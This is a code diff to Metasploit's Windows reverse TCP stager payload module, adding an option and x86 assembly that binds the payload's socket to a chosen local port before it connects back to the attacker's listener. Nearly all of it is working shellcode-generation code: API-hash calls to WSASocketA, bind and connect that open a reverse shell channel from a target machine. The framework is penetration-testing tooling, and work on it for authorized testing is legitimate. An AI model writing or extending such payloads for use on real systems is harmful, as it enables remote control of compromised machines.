@@ -23,6 +23,14 @@ module Payload::Windows::ReverseTcp
   include Msf::Payload::Windows::Exitfunk
 
   #
+  # Register reverse tcp specific options
+  #
+  def initialize(*args)
+    super
+    register_advanced_options([ OptString.new('PayloadBindPort', [false, 'Port to bind reverse tcp socket to on target system.', '0']) ], self.class)
+  end
+
+  #
   # Generate the first stage
   #
   def generate(opts={})
@@ -31,6 +39,7 @@ module Payload::Windows::ReverseTcp
       port:        ds['LPORT'],
       host:        ds['LHOST'],
       retry_count: ds['ReverseConnectRetries'],
+      bind_port:   ds['PayloadBindPort'],
       reliable:    false
     }
 
@@ -99,9 +108,15 @@ module Payload::Windows::ReverseTcp
   #
   def asm_reverse_tcp(opts={})
 
+    bind_port    = opts[:bind_port]
+    
+    encoded_bind_port = "0x%.8x" % [bind_port.to_i,2].pack("vn").unpack("N").first
     retry_count  = [opts[:retry_count].to_i, 1].max
     encoded_port = "0x%.8x" % [opts[:port].to_i,2].pack("vn").unpack("N").first
     encoded_host = "0x%.8x" % Rex::Socket.addr_aton(opts[:host]||"127.127.127.127").unpack("V").first
+
+    addr_fam      = 2
+    sockaddr_size = 16
 
     asm = %Q^
       ; Input: EBP must be the address of 'api_call'.
@@ -141,6 +156,33 @@ module Payload::Windows::ReverseTcp
         push #{Rex::Text.block_api_hash('ws2_32.dll', 'WSASocketA')}
         call ebp                ; WSASocketA( AF_INET, SOCK_STREAM, 0, 0, 0, 0 );
         xchg edi, eax           ; save the socket for later, don't care about the value of eax after this
+    ^
+    # Check if a bind port was specified
+    if bind_port != 0
+      asm << %Q^
+        xor eax, eax
+        push 11
+        pop ecx
+        push_0_loop:
+        push eax               ; if we succeed, eax will be zero, push it enough times
+                               ; to cater for both IPv4 and IPv6
+        loop push_0_loop
+
+                         ; bind to 0.0.0.0/[::], pushed above 
+        push #{encoded_bind_port}   ; family AF_INET and port number
+        mov esi, esp           ; save a pointer to sockaddr_in struct
+        push #{sockaddr_size}  ; length of the sockaddr_in struct (we only set the first 8 bytes, the rest aren't used)
+        push esi               ; pointer to the sockaddr_in struct
+        push edi               ; socket
+        push #{Rex::Text.block_api_hash('ws2_32.dll', 'bind')}
+        call ebp               ; bind( s, &sockaddr_in, 16 );
+      ^
+    end
+    
+    asm << %Q^
+        push #{encoded_host}    ; host in little-endian format
+        push #{encoded_port}    ; family AF_INET and port number
+        mov esi, esp  
 
       try_connect:
         push 16                 ; length of the sockaddr struct
